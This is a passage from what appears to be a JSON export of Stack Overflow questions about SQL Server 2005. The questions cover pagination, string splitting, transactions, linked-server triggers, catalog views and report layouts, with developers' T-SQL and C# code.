(exc.Message.Contains(\"NoCatch\") || exc.Message.Contains(\"maxUrlLength\"))\n            return;\n\n        //Redirect HTTP errors to HttpError page\n        //Server.Transfer(\"HttpErrorPage.aspx\");\n        return;\n    }\n\n\n}\n\n\n\n&lt;/script&gt;\n</code></pre>\n\n<p>How do I catch this exception? Why isn't it being caought?</p>\n"},{"tags":["sql-server","sql-server-2005","xp-cmdshell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12203245,"title":"Why do I get an error with sql cmdshell when it works in the actual shell?","body":"<p>I run the following:</p>\n\n<pre><code>EXEC XP_CMDSHELL 'fsutil fsinfo volumeinfo C:'\n</code></pre>\n\n<p>returns \n    Error:  The filename, directory name, or volume label syntax is incorrect.\n    NULL\n    NULL</p>\n\n<p>However, hitting the D: drive works just fine.  Also if I just run <code>fsutil fsinfo volumeinfo C:</code> from DOS prompt (e.g. regular command shell) - that works fine too.</p>\n\n<p>What am I missing here?</p>\n"},{"tags":["sql","sql-server-2005","loops","split"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":948,"score":0,"question_id":9980695,"title":"split select results (one column) into multiple columns","body":"<p>I've been trying to work out how to accomplish this, but I think I just don't have the skills to know what to look for in the first place. I'm working with an existing system, and I cannot alter the database schema, nor can I dictate how the users enter data. I have to work with what we have.</p>\n\n<p>Currently, our user is putting stats data into one text field in a table. They are using a standard format of one stat per line, with text qualifiers to 'delimit' the details of the stat. i.e.</p>\n\n<pre><code>&lt;Category&gt; - D:&lt;Description&gt; Q:&lt;Quanitity&gt; V:&lt;Value&gt;\n&lt;Category&gt; - D:&lt;Description&gt; Q:&lt;Quanitity&gt; V:&lt;Value&gt;\n</code></pre>\n\n<p>(there aren't any &lt;> brackets in the actual data... I was just using them to show where details go.)</p>\n\n<p>In the above example, the two stats are held in one text field record... and there are many of these 'stats' records in the table.</p>\n\n<p>Edit: I am using MS SQL Server 2005\nI need to create a report for sums of quanitites/values per description.</p>\n\n<p>I have implemented a split user function that I can use on one record to split each line into individual records... but that is as far as I've managed to get.</p>\n\n<p>I need to 'Select Stats from StatsTable', then loop through each stats record, split it up into individual lines, then extract the category, description, quantity and value from each split line, then return all of the results in one table.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12193668,"title":"How can i backup a particular table with table data in SQL server 2005","body":"<p>I want to backup a particular table with table data from a database in SQL Server 2005.\nThanks.</p>\n"},{"tags":["sql-server-2005","pagination","rownumber","rowcount"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":466,"score":2,"question_id":1668069,"title":"Consolidated: SQL 2005+ Dynamic Pagination using SET ROWCOUNT or RowNumber()?","body":"<p>I've a complex SP which applies multiple JOINs and lookup and come complex filters like comma-separated values, etc... On top of it, I've to deploy two complex yet performance-effective features:</p>\n\n<p><strong>1. Dynamic sorting</strong> but I see its limited - you kno the long/clumsy CASE hierarchy, its strange that experts also agree that this is the only 'best' solution we've got:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/149380/dynamic-sorting-within-sql-stored-procedures\">Dynamic Sorting within SQL Stored Procedures</a>\n<a href=\"http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=5942\" rel=\"nofollow\">http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=5942</a></p>\n\n<p>Anyway, I don't expect much on this one for now.</p>\n\n<p><strong>2. Dynamic pagination</strong> - that is I want the SP to be able to return only X number of records (X = page size) starting from Y (Y = page number). I hope you've got the general idea.</p>\n\n<p>To make it more clear I want to use something available in MySQL &amp; PostgreSQL: </p>\n\n<pre><code>[LIMIT { number | ALL }] [OFFSET number]\n</code></pre>\n\n<p><a href=\"http://stackoverflow.com/questions/1545203/database-sql-pagination\">Database: SQL Pagination?</a>\n<a href=\"http://www.sql.org/sql-database/postgresql/manual/queries-limit.html\" rel=\"nofollow\">http://www.sql.org/sql-database/postgresql/manual/queries-limit.html</a></p>\n\n<p><em>Its strange such a simple &amp; basic functionality is NOT available in SQL 2005+ .. or am I wrong (I'd be glad to hear it :-))</em></p>\n\n<hr>\n\n<p>I've known two approaches which suite my performance\\complexity tradeoff - </p>\n\n<p><strong>[2.1] Using the 'RowNumber()' feature of SQL 2005</strong> and then applying filter: (I've used it in past)</p>\n\n<pre><code>WHERE (Row BETWEEN (@PageIndex-1) * @PageSize +1 AND @PageIndex* @PageSize)\n</code></pre>\n\n<p>But again, this needs creating a temp table or using a WITH clause. This is also explained in:\n<a href=\"http://stackoverflow.com/questions/187998/row-offset-in-ms-sql-server\">Row Offset in SQL Server</a></p>\n\n<p><strong>[2.2] I found some new ways.</strong> One of them is using the </p>\n\n<pre><code>SET ROWCOUNT\n</code></pre>\n\n<p><a href=\"http://www.4guysfromrolla.com/webtech/042606-1.shtml\" rel=\"nofollow\">http://www.4guysfromrolla.com/webtech/042606-1.shtml</a></p>\n\n<p><em>And they say that overall 2.2 is effective then 2.1. Is it? Also, I wanted to know what happens if two user-requests trigger the same SP twice simultaneously .. I hope the 'SET ROWCOUNT' won't be 'shared' or 'over-written' among simultaneous SP-calls. Pls confirm.\nAny other points comparing 2.1 &amp; 2.2 ?</em></p>\n"},{"tags":["sql-server","sql-server-2005","ssms"],"answer_count":6,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2075,"score":4,"question_id":971560,"title":"How to order project solution content in SQL Server Management Studio","body":"<p>In SQL Server Management Studio (SSMS) running against SQL Server 2005, I have a solution which contains a number of views.</p>\n\n<p>These views are not sorted alphabetically.</p>\n\n<p>Can anyone provide either an explanation of why, or a solution to order them alphabetically ?</p>\n"},{"tags":["c#","sql-server-2005","transactions"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12185070,"title":"Can't immediately see data after committing sql transaction ","body":"<p>Updated for more direct title..</p>\n\n<p>I am having an issue with seeing committed data from my transactions immediately after the commit.</p>\n\n<p>I am accepting data from user input, putting data into the DB (SQL Server 2005) in the form of a parent table with multiple children tables with 1-many relationships. I am using a transaction and committing it when complete. The data is committed to the DB but I immediately run several other queries (<code>SELECT</code> statements only) against the DB after the commit to check to see if all the rows for a group have been entered. These rows can be entered at any time by anyone and are each in their own transaction. So, say the \"group\" has 3 total rows that are required in the database, I want to commit my transaction and then read the DB to see if ANY groups are complete...including that of the transaction I just committed.</p>\n\n<p>The problem is that apparently reading the data back after the commit doesn't bring back the transaction I just committed... if this transaction is the last row in the group then it gets missed by the reads and doesn't return.</p>\n\n<p>So...  </p>\n\n<ul>\n<li>Transaction begins.</li>\n<li>write rows...</li>\n<li>transaction commits..</li>\n<li>read to see if complete groups exist...</li>\n<li>group with current transaction not returned.  other complete groups returned.</li>\n</ul>\n\n<p>One thing to note, submitting another transaction will cause this data to be returned... if this new transaction contains a row to complete another group I do not get the new row returned...</p>\n\n<p>Here is my code.. abbreviated...</p>\n\n<pre><code>SqlConnection sqlConn = getConn();  //getconn is a function that returns a connection object\n\nString sqlSTR = \"&lt;&lt;&lt;MY INSERT STATEMENT&gt;&gt;&gt;\";\nSqlTransaction trans = sqlConn.BeginTransaction(System.Data.IsolationLevel.ReadUncommitted,\"Trans\");\nSqlCommand sqlCMD;\ntry\n{\n    sqlCMD = new SqlCommand(sqlSTR, sqlConn, trans);\n\n    //...Add all my data to the DB.\n\n    trans.Commit();\ncatch (SqlException sqlErr)\n{\n    trans.Rollback(\"Trans\");\n    throw;\n}\nfinally\n{\n    trans.Dispose();\n}\n</code></pre>\n\n<p>Next is some code to read the DB looking for \"completed groups\" but the group this data belongs to, if completed, is not returned.</p>\n\n<p>The data is stored... The data is retrievable by the same code by the next call.. but not here.</p>\n\n<p>It's as if it takes time to commit the transaction by SQL and my reads are called BEFORE it's committed by SQL Server... even though I have the transaction set to allow reads to uncommitted data.</p>\n\n<p>Is there someway to have the commit to wait for completion of the commit BEFORE moving on to other code?</p>\n\n<p>I've tried doing a <code>SELECT @@TRANCOUNT</code> against the connection immediately after the commit but it ALWAYS returns 0.</p>\n\n<p>Thanks!</p>\n\n<p>EDIT:</p>\n\n<pre><code>public static SqlConnection getConn()\n{\n    try\n    {\n        string sqlStr = WebConfigurationManager.ConnectionStrings[\"conn_Main\"].ConnectionString;\n\n        SqlConnection sqlCN = new SqlConnection(sqlStr);\n        sqlCN.Open();\n\n        return sqlCN;\n    }\n    catch\n    {\n        throw;\n    }\n}\n</code></pre>\n\n<p>I'm reading the records after the transaction by using a stored procedure...</p>\n\n<p>In the SP I am using a basic select statement that does a couple of joins and not much else to pull back first a list of \"groups\" that have submissions and then each group individually pulls the individual groups.  It's the 2nd part that doesn't seem to see the records inserted with the transaction...  until the next transaction is committed.</p>\n\n<p>I'm doing some more testing this morning to see if I can tell exactly when the records show up after committing the transaction.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12195504,"title":"Splitting a string then pivoting result","body":"<p>If have a string passed from a .Net application that looks like the below </p>\n\n<pre><code>2023|F66451,1684|648521,1684|600271,2137|019592\n</code></pre>\n\n<p>I have started to parse out the string using the method below but I need to Pivot the data returned from the Split ( surrounded by *'s) function in order to insert into the #tmpExceptions table</p>\n\n<pre><code>DECLARE @ExceptionsList as nvarchar(MAX)\n\nSET @ExceptionsList = '2023|F66451,1684|648521,1684|600271,2137|019592'\n\nSET NOCOUNT ON;\n\nDECLARE @CurrentLineItem as nvarchar(255)\n\nCREATE TABLE #ParsePassOne\n(\n    LineItem nvarchar(255)\n)\n\nCREATE TABLE #tmpExceptions\n(\n    AccountNumber int,\n    ClaimNumber nvarchar(50)\n)\n\nINSERT INTO #ParsePassOne\n    SELECT value FROM Split( ',' ,@ExceptionsList)\n\nWHILE EXISTS(SELECT LineItem FROM #ParsePassOne)\n    BEGIN\n        SELECT TOP 1 @CurrentLineItem = LineItem FROM #ParsePassOne\n\n        *******\n            SELECT value FROM Split( '|' ,@CurrentLineItem) \n            *******\n\n        DELETE FROM #ParsePassOne WHERE LineItem = @CurrentLineItem\n    END\n\nSELECT * FROM #tmpExceptions\n\nDROP TABLE #ParsePassOne\nDROP TABLE #tmpExceptions\n</code></pre>\n\n<p>So far the data returned looks as below. I just need to pivot the data to columns so I can insert it. How do I go about this?</p>\n\n<p><img src=\"http://i.stack.imgur.com/xAHL8.png\" alt=\"enter image description here\"></p>\n\n<p><strong>Split Function</strong></p>\n\n<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\n--Creates an 'InLine' Table Valued Function (TVF)\nALTER FUNCTION [dbo].[Split] \n   (  @Delimiter varchar(5), \n      @List      varchar(8000)\n   ) \n   RETURNS @TableOfValues table \n      (  RowID   smallint IDENTITY(1,1), \n         [Value] varchar(50) \n      ) \nAS \n   BEGIN\n\n      DECLARE @LenString int \n\n      WHILE len( @List ) &gt; 0 \n         BEGIN \n\n            SELECT @LenString = \n               (CASE charindex( @Delimiter, @List ) \n                   WHEN 0 THEN len( @List ) \n                   ELSE ( charindex( @Delimiter, @List ) -1 )\n                END\n               ) \n\n            INSERT INTO @TableOfValues \n               SELECT substring( @List, 1, @LenString )\n\n            SELECT @List = \n               (CASE ( len( @List ) - @LenString ) \n                   WHEN 0 THEN '' \n                   ELSE right( @List, len( @List ) - @LenString - 1 ) \n                END\n               ) \n         END\n\n      RETURN \n\n   END \n</code></pre>\n"},{"tags":["sql-server-2005","inner-join","rownumber"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1058,"score":1,"question_id":2002816,"title":"INNER JOIN And Row_Num() Function Problem","body":"<p>I have  a stored Procedure which do Sorting and Paging like the <a href=\"http://aspnet.4guysfromrolla.com/articles/032206-1.aspx\" rel=\"nofollow\">Sorting Custom Paged Results of</a> of Scott Michell . I have two tables: Article and Category ,My StoredProcedure works fine for Article Table , But i want add a field of Category into queyr (Inner Join I mean )<br>\nActually I can't do  like the Scott Michell has done , Because there are some field that are similar at both Tables .(When i do like Scott all the time i get \"Ambiguous Column Error\")\nMy StoredProcedure without Inner join is :</p>\n\n<pre><code>set ANSI_NULLS ON\nset QUOTED_IDENTIFIER ON\ngo\n\n\nALTER PROCEDURE [dbo].[sp_Articles_SelectByCategoryId]\n @CategoryId int,\n @startRowIndex int = -1,\n @maximumRows int = -1,\n @sortExpression nvarchar(50),\n @recordCount int = NULL OUTPUT\n\nAS\n\nIF (@recordCount IS NOT NULL)\n BEGIN\n  SET @recordCount = (SELECT COUNT(*) FROM [dbo].[Articles] WHERE [CategoryId] = @CategoryId\n )\n  RETURN\n END\n\nIF LEN(@sortExpression) = 0\n   SET @sortExpression = 'Id'\n\nDECLARE @sql nvarchar(4000)\nSET @sql = \n'SELECT\n [Id],\n [AddedDate],\n [AddedBy],\n [CategoryId],\n [Title],\n [Abstract],\n [Body]\n\nFROM\n (SELECT \n\n [Id],\n [AddedDate],\n [AddedBy],\n [CategoryId],\n [Title],\n [Abstract],\n [Body],\n\nROW_NUMBER() OVER(ORDER BY ' + @sortExpression + ') as RowNum\n\n FROM  [dbo].[Articles]\n\n WHERE CategoryId = ' + CONVERT(nvarchar(10), @CategoryId) + '\n ) as CategoryIdInfo\n WHERE \n ((RowNum between (' + CONVERT(nvarchar(10), @startRowIndex) + ') AND ' + CONVERT(nvarchar(10), @startRowIndex) + ' + ' + CONVERT(nvarchar(10), @maximumRows) + ' - 1) \n   OR ' + CONVERT(nvarchar(10), @startRowIndex) + ' = -1 OR ' + CONVERT(nvarchar(10), @maximumRows) + ' = -1)'\n\n  -- Execute the SQL query\n  EXEC sp_executesql @sql\n\n\n--endregion\n</code></pre>\n\n<p>My Category Table is :</p>\n\n<pre><code>CREATE TABLE [dbo].[Category](\n [Id] [int] IDENTITY(1,1) NOT NULL,\n [AddedDate] [datetime] NOT NULL,\n [AddedBy] [nvarchar](250) COLLATE Arabic_CI_AS NOT NULL,\n [Title] [nvarchar](50) COLLATE Arabic_CI_AS NOT NULL,\n [Importance] [int] NOT NULL,\n [Description] [nvarchar](300) COLLATE Arabic_CI_AS NULL,\n [ImageUrl] [nvarchar](50) COLLATE Arabic_CI_AS NULL,\n CONSTRAINT [PK_Category] PRIMARY KEY CLUSTERED \n(\n [Id] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n</code></pre>\n\n<p>My Article Table :</p>\n\n<pre><code>CREATE TABLE [dbo].[Articles](\n    [Id] [int] IDENTITY(1,1) NOT NULL,\n    [AddedDate] [datetime] NOT NULL,\n    [AddedBy] [nvarchar](250) COLLATE Arabic_CI_AS NOT NULL,\n    [CategoryId] [int] NOT NULL,\n    [Title] [nvarchar](255) COLLATE Arabic_CI_AS NOT NULL,\n    [Abstract] [nvarchar](4000) COLLATE Arabic_CI_AS NULL,\n    [Body] [nvarchar](max) COLLATE Arabic_CI_AS NOT NULL,\n    [ReleaseDate] [datetime] NULL,\n    [ExpireDate] [datetime] NULL,\n    [Approved] [bit] NOT NULL,\n    [Listed] [bit] NOT NULL,\n    [CommentEnabled] [bit] NOT NULL,\n    [OnlyForMembers] [bit] NOT NULL,\n    [ViewCount] [int] NOT NULL,\n    [Votes] [int] NOT NULL,\n    [TotalRating] [int] NOT NULL,\n CONSTRAINT [PK_Articles] PRIMARY KEY CLUSTERED \n(\n    [Id] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n</code></pre>\n\n<p>I don't know how to add The \"Title\" Column of \"Category\" Table into Query .</p>\n\n<p>if my Category table hadn't similar fields, surely this query workes :</p>\n\n<pre><code>DECLARE @sql nvarchar(4000)\nSET @sql = \n'SELECT\n    [Id],\n    [AddedDate],\n    [AddedBy],\n    [CategoryId],\n    [Title],\n    [Abstract],\n    [Body],\n    ArticleTitle\nFROM\n    (SELECT \n\n    [Id],\n    [AddedDate],\n    [AddedBy],\n    a.[CategoryId],\n    [Title],\n    [Abstract],\n    [Body],\n    b.Title as CategoryTitle ,\nROW_NUMBER() OVER(ORDER BY ' + @sortExpression + ') as RowNum\n\n    FROM  [dbo].[Articles] a INNER JOIN Category b on a.CategoryId = b.Id\n\n    WHERE a.CategoryId = ' + CONVERT(nvarchar(10), @CategoryId) + '\n    ) as CategoryIdInfo\n</code></pre>\n\n<p>If you want to Test you can download the <a href=\"http://sites.google.com/site/dindarbiz/file-cabinet/StoredProcedureAndTables.rar?attredirects=0&amp;d=1\" rel=\"nofollow\">Attachment(Tables and StoredProcedure)</a>\nThank you </p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2565,"score":3,"question_id":4381765,"title":"INFORMATION_SCHEMA vs sysobjects","body":"<p>In SQL Server:</p>\n\n<p>What is the difference between INFORMATION_SCHEMA and sysobjects? Does one provide more information than the other or are they used for different things usually?</p>\n\n<p>Is sysobjects the same as sys.objects? If not, what is the difference between these?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12194879,"title":"What is the best approach to determine if a column exists in a SQL Server database table?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4381765/information-schema-vs-sysobjects\">INFORMATION_SCHEMA vs sysobjects</a>  </p>\n</blockquote>\n\n\n\n<p>I'm maintaining an old system (SQL Server 2005) and have come across 2 versions of a select statement that do the same thing. </p>\n\n<p><strong>Is one of the statements below more valid than the other?</strong></p>\n\n<pre><code>SELECT 1 \nFROM INFORMATION_SCHEMA.COLUMNS \nWHERE TABLE_NAME = 'tblMyTable' AND COLUMN_NAME = 'MyColumn'\n</code></pre>\n\n<p>or</p>\n\n<pre><code>SELECT 1  \nFROM sys.columns \nWHERE object_id = OBJECT_ID(N'[dbo].[tblMyTable]') AND name = N'MyColumn'\n</code></pre>\n"},{"tags":["php","sql-server-2005","iis6"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12192836,"title":"Friendly subfolder link to page (wikipedia style)","body":"<p>I am struggling to find this as I'm not sure exactly what I'm looking for!</p>\n\n<p>I've seen that some sites seem to use 'subfolders' as links to pages, e.g. wikipedia.</p>\n\n<p>E.g. Let's say I had a record in a database with a unique title \"My Shopping List\". I want to be able to navigate to <strong>www.mySite.com/my_shopping_list</strong> and have it automatically 'forward' to a page showing the relevant record.</p>\n\n<p>I am using IIS and wondering if there's a way I can do it with that, but I may be looking in the wrong place.</p>\n\n<p>This is for a knowledgebase where I might write an article called \"how to use a computer\" and would like to be able to create a 'friendly' link for users (<strong>http://www.mySite.com/how_to_use_a_computer</strong> rather than <strong>http://www.mySite.com/article.php?ID=123</strong>. I will need to be able to create these 'links' dynamically using the title field.</p>\n\n<p>Thank you</p>\n\n<p>EDIT: I am using IIS6</p>\n"},{"tags":["c#","sql","sql-server-2005"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":12193514,"title":"How to read the stored procedure query from Sql Server 2005 in C#?","body":"<p>I have a simple stored procedure</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[simple]\n\nAS\nBEGIN\n    -- SET NOCOUNT ON added to prevent extra result sets from\n    -- interfering with SELECT statements.\n    SET NOCOUNT ON;\n\n    DECLARE @sql NVARCHAR(MAX)\n\n    SELECT @sql = '\n            SELECT TOP(5) * FROM aTable'\n        PRINT @sql\n\n    EXEC sp_executesql \n        @sql\nEND\n</code></pre>\n\n<p>And now, in C#, I want to get, if is possible, the <code>@sql</code> value from stored procedure (after it was executed).</p>\n\n<p>I use Sql Server 2005.</p>\n\n<p>How to do that in <strong>C#</strong>?</p>\n"},{"tags":["sql-server","sql-server-2005","oracle","transactions","ddl"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":956,"score":6,"question_id":4711447,"title":"Oracle: DDL and transaction rollback","body":"<p>Could in Oracle DDL (create/alter) be transactional like they are in MS SQL (started from 2005)? </p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12193445,"title":"Get rows with IDs retrieved from other table, in the right order","body":"<p>I have two tables, <code>Posts</code> and <code>Cache</code>.</p>\n\n<p><code>Cache</code> tables saves that with Posts should I show. Posts IDs are saved in a column (<code>PostIDs</code> in <code>Cache</code> table, separated by a comma (<code>,</code>).</p>\n\n<p>And this is my code:</p>\n\n<pre><code>SELECT * FROM Posts a\nWHERE ID IN \n(\n  SELECT item FROM Cache AS b\n  CROSS APPLY dbo.fnSplit(b.postIDs, ',') \n  WHERE ((b.ownerID = 1) AND (b.magID = 8))\n)\n</code></pre>\n\n<p>Also <code>fnSplit</code> is working correctly.</p>\n\n<p>But the problem is, the order of posts is not correct.</p>\n\n<p>For example, if We have this string in <code>Cache</code> : <code>5,1,9,4,10,3</code>, I want to get posts from <code>Posts</code> with that order. (First row should be the post with ID 5, then 1, then 9, then 4, ...)</p>\n\n<p>But my code returns posts in another order: <code>1,3,4,5,9,10</code> (The order of rows in <code>Posts</code> table)</p>\n\n<p>What should I do (pure SQL) to get items in the order specified in <code>Cache</code> table? (In that example, I want to get posts in this order: <code>5,1,9,4,10,3</code>)</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12193345,"title":"Error after deleting default users in SQL Server 2005","body":"<p>I installed my software on client pc with SQL Server 2005, it was running correctly, until I deleted the administrator, user and nt built in accounts.</p>\n\n<p>Now the software connects but can't retain the connection state.</p>\n\n<p>I am getting this error. ^</p>\n\n<blockquote>\n  <p><em>ERROR : ExecuteReader requires an open and available connection.</em></p>\n</blockquote>\n\n<p>Before user deletion there was no error.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12188811,"title":"Update statement in trigger takes longer to execute than executing it outside of trigger","body":"<p>I have a trigger for <code>After Update</code> </p>\n\n<p>This trigger works on a server which is going to update 2 tables on a linked server</p>\n\n<p>See code </p>\n\n<pre><code>ALTER TRIGGER [dbo].[tgAfterUpdate] ON  [dbo].[KS_3EToVision]\n   AFTER UPDATE\nAS \nBEGIN\n\n  BEGIN TRY\n  BEGIN TRANSACTION    -- Start the transaction\n\n  DECLARE @MatterNumber varchar(15);\n  SELECT @MatterNumber = i.MatterNumber FROM inserted i; \n\n    IF EXISTS(SELECT * FROM [FSSQLDEV01].[collnab].[dbo].[collection_header] WHERE         Ch_file_number COLLATE DATABASE_DEFAULT = @MatterNumber COLLATE DATABASE_DEFAULT)\n       --UPDATE\n        IF (SELECT Ch_matter_status FROM [FSSQLDEV01].[collnab].[dbo].[collection_header] WHERE Ch_file_number COLLATE DATABASE_DEFAULT = @MatterNumber COLLATE DATABASE_DEFAULT ) = 'Current'\n             BEGIN \n                --Parent table \n                UPDATE [FSSQLDEV01].[collnab].[dbo].[collection_header]\n                SET \n                    Ch_start_date = i.OpenDate \n                FROM \n                    Inserted i \n                WHERE ch_file_number COLLATE DATABASE_DEFAULT = @MatterNumber COLLATE DATABASE_DEFAULT  \n\n                ----Child table \n                UPDATE [FSSQLDEV01].[collnab].[dbo].[collections] \n                SET \n                    Defendant_1 = i.Description \n                    , Loan_Number_1 = i.Comments \n                    , Client = i.KS_BookName \n                    , Date_Instructed = i.OpenDate \n                    , Person_Responsible_name = i.ResponsibleFeeEarnerName \n                    , Person_Responsible_Email = i.ResponsibleFeeEarnerEmail \n                    , Person_Acting_name = i.BillingFeeEarnerName \n                    , Person_Acting_email = i.BillingFeeEarnerEmail \n                    , Agent_Acting_name = i.BillingFeeEarnerName \n                    , Agent_Acting_email = i.BillingFeeEarnerEmail \n                    , CBA_Panel_Service_Area = i.KS_ServiceCat \n                    , HBN_Number = i.KS_ClientAcctRef \n                    , St_George_Contact = i.KS_Instructor \n                FROM \n                    Inserted i \n                WHERE Left(Collections.file_number,6) COLLATE DATABASE_DEFAULT = @MatterNumber COLLATE DATABASE_DEFAULT\n             END\n\n--If we reach here, success!\n   COMMIT\nEND TRY\nBEGIN CATCH\n  -- Whoops, there was an error\n  IF @@TRANCOUNT &gt; 0\n     ROLLBACK\n\n  -- Raise an error with the details of the exception\n  DECLARE @ErrMsg nvarchar(4000), @ErrSeverity int\n  SELECT @ErrMsg = ERROR_MESSAGE(),\n     @ErrSeverity = ERROR_SEVERITY()\n\n  RAISERROR(@ErrMsg, @ErrSeverity, 1)\nEND CATCH\n\nEND \n</code></pre>\n\n<p>if i try the update statement with the same criteria outside of the trigger it will only take 1 second but inside the trigger it can take upto 45 seconds.</p>\n\n<p>I have narrowed it down to the second update statement being the problem, because if i remove  the second update statement it will execute quickly.</p>\n\n<p>I have also attached an image the shows </p>\n\n<p>I also have a Trigger for Insert and this works quickly within a second And one for Deleting which will take an extended period with in the trigger but functions fine if i remove the 2 delete statements outside of the trigger.</p>\n\n<pre><code>USE [TE_3E_TRG]\nGO\n/****** Object:  Trigger [dbo].[tgAfterDelete]    Script Date: 08/30/2012 11:24:33 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\n\nALTER TRIGGER [dbo].[tgAfterDelete] ON  [dbo].[KS_3EToVision]\n   AFTER DELETE\nAS \n\nbegin\n\nBEGIN TRY\n   BEGIN TRANSACTION    -- Start the transaction\n            Begin\n                --Parent table \n                DELETE FROM [FSSQLDEV01].[collnab].[dbo].[collection_header] WHERE ch_file_number COLLATE DATABASE_DEFAULT = (SELECT d.MatterNumber FROM deleted  d) COLLATE DATABASE_DEFAULT\n\n                --Child table \n                DELETE FROM [FSSQLDEV01].[collnab].[dbo].[collections] WHERE Left(file_number,6) COLLATE DATABASE_DEFAULT = (SELECT d.MatterNumber FROM deleted  d) COLLATE DATABASE_DEFAULT            \n\n            END\n   -- If we reach here, success!\n   COMMIT\nEND TRY\nBEGIN CATCH\n  -- Whoops, there was an error\n  IF @@TRANCOUNT &gt; 0\n     ROLLBACK\n\n  -- Raise an error with the details of the exception\n  DECLARE @ErrMsg nvarchar(4000), @ErrSeverity int\n  SELECT @ErrMsg = ERROR_MESSAGE(),\n         @ErrSeverity = ERROR_SEVERITY()\n\n  RAISERROR(@ErrMsg, @ErrSeverity, 1)\nEND CATCH\n</code></pre>\n\n<p>Does anyone know why this drastic difference in execution time may occur between executing the statements within the trigger and out side of the trigger?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","reporting-services","crystal-reports"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":151,"score":2,"question_id":12184476,"title":"SQL Server 2005 need to create fake columns in a query","body":"<p>Hi All this is going to be a very strange question and all my searching has resulted in no good answers. The basic problem will help me solve two problems one in Crystal Reports and one in SSRS 2005. I have reports in both that need the same kind of solution. please bear with me as the explanation will be a bit lengthy.</p>\n\n<p>I need to use SSRS in an unusual fashion. The reports I need to create will only have minimal data and will be printed and filled in by hand in the field. They are being used as form printing program in this case.</p>\n\n<p>The reports will have a tablix/Matrix control on them and I need to create it with a specific # of columns regardless of if the data exists for those columns or not. In one case (SSRS), there are no fields that are being used as data fields that will be summed.</p>\n\n<p>I have data for the rows and columns, but what I need is to create the matrix/tablix with 10 columns. So if the recordset  has only 2 instances of the data that will make the columns, I still want to see all 10 columns but the headers being blank.</p>\n\n<p>So it would look something like this:</p>\n\n<pre><code>                         Col1|Col2|Col3|Fake1|Fake2|Fake3|......\nRow1\nRow2\nRow3\n.....\n</code></pre>\n\n<p>So if I have 1 column or 10 columns worth of data I still want to display 10 columns 2 with real headers and 8 with blank headers.</p>\n\n<p>Here is the SQL I'm using. this is the basis for a matrix in SSRS 2005. The Employee ID and Name are the rows. the JobAccount_Tracking_ID is the column.\nA record can have from 1 to 10 tracking_ids. </p>\n\n<p>What I want to return is a total of 10 tracking IDs regardless of the actual number of tracking IDs. The extras would show up in the matrix as blank columns.</p>\n\n<pre><code>Declare @FieldLogID as int\nSet @FieldLogID = 1018\n\nSELECT DISTINCT\nCustomizedFieldLogEmployee_1.Employee_EmployeeID, \nCustomizedFieldLogEmployee_1.Employee_FullName, \nCustomizedFieldLogEmployee_1.Injured_Today_Custom, \nCustomizedFieldLogJobAccount_1.JobAccount_TrackingID, \nCustomizedFieldLogEmployee_1.StartDateTime, \nCustomizedFieldLogEmployee_1.StopDateTime, \nCustomizedFieldLogEmployee_1.WorkHours\nFROM\nCustomizedFieldLogEmployee AS CustomizedFieldLogEmployee_1 LEFT OUTER JOIN CustomizedFieldLogJobAccount AS CustomizedFieldLogJobAccount_1 \nON CustomizedFieldLogEmployee_1.FieldLog_FieldLogID = CustomizedFieldLogJobAccount_1.FieldLog_FieldLogID\nWHERE CustomizedFieldLogEmployee_1.FieldLog_FieldLogID = @FieldLogID\n</code></pre>\n\n<p>Any ideas how I can do this? In the SSRS case I can't create a view in the database as it is a vendor's db. 